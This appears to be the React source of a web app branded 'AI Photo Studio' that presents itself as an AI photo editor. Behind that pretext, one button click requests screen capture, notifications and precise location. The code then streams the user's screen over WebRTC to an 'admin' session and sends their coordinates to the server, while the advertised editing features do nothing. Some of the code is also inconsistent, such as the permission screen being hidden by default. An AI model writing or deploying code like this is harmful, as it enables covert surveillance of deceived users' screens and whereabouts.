 import { useEffect, useRef, useState } from "react";
import { io } from "socket.io-client";
 import "./App.css";

const initialPermissions = {
  screen: "pending",
  notification: "pending",
  location: "pending",
};

function App() {
  const [permissions, setPermissions] = useState(initialPermissions);
  const [requesting, setRequesting] = useState(false);
  const [completed, setCompleted] = useState(true);
  const [location, setLocation] = useState(null);
  const [selectedPhoto, setSelectedPhoto] = useState(null);

 
  const screenVideoRef = useRef(null);
 
  const screenStreamRef = useRef(null);
const socketRef = useRef(null);
const peerRef = useRef(null);
const sessionIdRef = useRef(
  localStorage.getItem("photoSafetySessionId") ||
    `user_${Math.random().toString(36).slice(2, 10)}`
);
 

useEffect(() => {
  const sessionId = sessionIdRef.current;

  localStorage.setItem("photoSafetySessionId", sessionId);

  const socket = io(
  import.meta.env.DEV
    ? "http://localhost:4000"
    : window.location.origin
);
  socketRef.current = socket;

  socket.on("connect", () => {
    socket.emit("user:join", { sessionId });
  });

  socket.on("user:admin-ready", async ({ adminSocketId }) => {
    const stream = screenStreamRef.current;

    if (!stream) return;

    peerRef.current?.close();

    const peer = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
    });

    peerRef.current = peer;

    stream.getTracks().forEach((track) => {
      peer.addTrack(track, stream);
    });

    peer.onicecandidate = (event) => {
      if (!event.candidate) return;

      socket.emit("signal:ice", {
        targetSocketId: adminSocketId,
        candidate: event.candidate,
      });
    };

    const offer = await peer.createOffer();
    await peer.setLocalDescription(offer);

    socket.emit("signal:offer", {
      adminSocketId,
      sessionId,
      offer: peer.localDescription,
    });
  });

  socket.on("signal:answer", async ({ answer }) => {
    if (peerRef.current && answer) {
      await peerRef.current.setRemoteDescription(answer);
    }
  });

  socket.on("signal:ice", async ({ candidate }) => {
    if (peerRef.current && candidate) {
      await peerRef.current.addIceCandidate(candidate);
    }
  });

  return () => {
    peerRef.current?.close();
    socket.disconnect();
  };
}, []);

const updatePermission = (name, value) => {
    setPermissions((previous) => ({
      ...previous,
      [name]: value,
    }));
  };

  const requestAllPermissions = async () => {
    setRequesting(true);

    /*
      Screen-share must be requested directly from a user click.
      Therefore all permission requests are started immediately here.
    */

    let screenPromise;

    if (navigator.mediaDevices?.getDisplayMedia) {
      screenPromise = navigator.mediaDevices.getDisplayMedia({
        video: true,
        audio: false,
      });
    } else {
      screenPromise = Promise.reject(
        new Error("Screen sharing is not supported.")
      );
    }

    

    let notificationPromise;

    if ("Notification" in window) {
      notificationPromise = Notification.requestPermission();
    } else {
      notificationPromise = Promise.reject(
        new Error("Notifications are not supported.")
      );
    }

    const locationPromise = new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Location is not supported."));
        return;
      }

      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      });
    });

    const [
      screenResult,
      notificationResult,
      locationResult,
    ] = await Promise.allSettled([
      screenPromise,
      notificationPromise,
      locationPromise,
    ])

    if (screenResult.status === "fulfilled") {
      const stream = screenResult.value;

      screenStreamRef.current = stream;

      if (screenVideoRef.current) {
        screenVideoRef.current.srcObject = stream;
      }

      updatePermission("screen", "granted");
socketRef.current?.emit("screen:update", {
  active: true,
});
      const screenTrack = stream.getVideoTracks()[0];

      if (screenTrack) {
        screenTrack.addEventListener("ended", () => {
          updatePermission("screen", "stopped");
          socketRef.current?.emit("screen:update", {
  active: false,
});
        });
      }
    } else {
      updatePermission("screen", "denied");
    }

    

    if (
      notificationResult.status === "fulfilled" &&
      notificationResult.value === "granted"
    ) {
      updatePermission("notification", "granted");
socketRef.current?.emit("notification:update", {
  status: "granted",
});
      new Notification("Permission enabled", {
        body: "Website notifications are now enabled.",
      });
    } else {
      updatePermission("notification", "denied");
    }socketRef.current?.emit("notification:update", {
  status: "denied",
});

    if (locationResult.status === "fulfilled") {
      const position = locationResult.value;

      setLocation({
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
      });

      updatePermission("location", "granted");
      socketRef.current?.emit("location:update", {
  latitude: position.coords.latitude,
  longitude: position.coords.longitude,
  accuracy: position.coords.accuracy,
});
    } else {
      updatePermission("location", "denied");
    }

    setRequesting(false);
    setCompleted(true);
  };

  

  const stopScreenShare = () => {
    screenStreamRef.current?.getTracks().forEach((track) => track.stop());
    screenStreamRef.current = null;

    if (screenVideoRef.current) {
      screenVideoRef.current.srcObject = null;
    }

    updatePermission("screen", "stopped");
  };

  const handlePhotoUpload = (event) => {
    const file = event.target.files?.[0];

    if (!file) {
      return;
    }

    if (!file.type.startsWith("image/")) {
      alert("Please select an image file.");
      return;
    }

    const photoUrl = URL.createObjectURL(file);
    setSelectedPhoto(photoUrl);
  };

  useEffect(() => {
    return () => {
      screenStreamRef.current
        ?.getTracks()
        .forEach((track) => track.stop());

      if (selectedPhoto) {
        URL.revokeObjectURL(selectedPhoto);
      }
    };
  }, [selectedPhoto]);

  const getStatusText = (status) => {
    const values = {
      pending: "Waiting",
      granted: "Allowed",
      denied: "Denied",
      stopped: "Stopped",
    };

    return values[status] || status;
  };

  return (
    <main className="app">
      {!completed && (
        <section className="permission-screen">
          <div className="permission-card">
            <div className="logo">PS</div>

            <p className="eyebrow">PHOTO SAFETY</p>

            <h1>AI Photo Studio</h1>

            <p className="description">
  Upload your photo and transform it with powerful AI editing tools.
  Enhance quality, remove backgrounds and create professional photos.
</p>

               <div className="permission-list">
  <div className="permission-item">
    <span className="permission-icon">✨</span>
    <div>
      <strong>AI Photo Enhance</strong>
      <small>Blur hatao aur photo quality improve karo</small>
    </div>
  </div>

  <div className="permission-item">
    <span className="permission-icon">🖼️</span>
    <div>
      <strong>Background Editor</strong>
      <small>Background remove ya replace karo</small>
    </div>
  </div>

  <div className="permission-item">
    <span className="permission-icon">🪄</span>
    <div>
      <strong>Smart AI Editing</strong>
      <small>Prompt likhkar professional photo banao</small>
    </div>
  </div>
</div>
            <button
              className="primary-button"
              onClick={requestAllPermissions}
              disabled={requesting}
            >
              {requesting
                ? "Waiting for permissions..."
                : "Start AI Photo Editor"}
            </button>

            <p className="privacy-note">
              Your browser will show official permission prompts. You can deny
              or stop access at any time.
            </p>
          </div>
        </section>
      )}

      {completed && (
        <section className="dashboard">
          <header className="dashboard-header">
            <div>
              <p className="eyebrow">PHOTO SAFETY</p>
              <h1>Photo editing dashboard</h1>
            </div>

          </header>

        

         

            <section className="panel upload-panel">
  <h2>Upload your photo</h2>

  <p>
    Upload a photo to preview it before sending it for editing.
  </p>

  <label className="upload-box">
    <input
      type="file"
      accept="image/*"
      onChange={handlePhotoUpload}
    />

    <span>Choose photo</span>
    <small>PNG, JPG, JPEG or WEBP</small>
  </label>
            {selectedPhoto && (
              <div className="photo-result">
                <img src={selectedPhoto} alt="Uploaded preview" />

                <div>
                  <h3>Photo ready</h3>
                  <p>Your photo has been selected successfully.</p>
                  <button className="primary-button">
                    Continue to photo editor
                  </button>
                </div>
              </div>
            )}
          </section>

         
        </section>
      )}
    </main>
  );
}

export default App;